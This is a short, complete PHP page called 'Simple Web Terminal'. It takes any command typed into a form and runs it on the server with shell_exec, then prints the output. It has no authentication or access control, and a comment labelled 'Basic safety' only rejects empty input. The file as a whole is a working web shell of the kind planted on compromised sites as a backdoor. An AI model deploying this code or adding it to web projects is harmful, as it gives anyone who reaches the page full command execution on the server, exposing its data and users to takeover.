<?php

// Initialize output
$output = "";
$error = "";

// Handle command submission
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $command = $_POST["command"] ?? "";

    // Basic safety: prevent empty commands
    if (!empty($command)) {

        // Optional: limit execution time
        set_time_limit(10);

        // Execute command
        $output = shell_exec($command . " 2>&1");

        if ($output === null) {
            $error = "Command returned no output.";
        }
    }
}

?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Simple Web Terminal</title>

<style>
body {
    background: #000;
    color: #00ff00;
    font-family: monospace;
    padding: 10px;
}

input {
    width: 100%;
    background: #000;
    color: #00ff00;
    border: none;
    outline: none;
    font-family: monospace;
    font-size: 16px;
}

pre {
    white-space: pre-wrap;
}
</style>

</head>

<body>

<h3>Simple Web Terminal</h3>

<form method="POST">
<input
    type="text"
    name="command"
    placeholder="Enter command (e.g., ls -la)"
    autofocus
>
</form>

<pre>
<?php
if (!empty($output)) {
    echo htmlspecialchars($output);
}

if (!empty($error)) {
    echo htmlspecialchars($error);
}
?>
</pre>

</body>
</html>
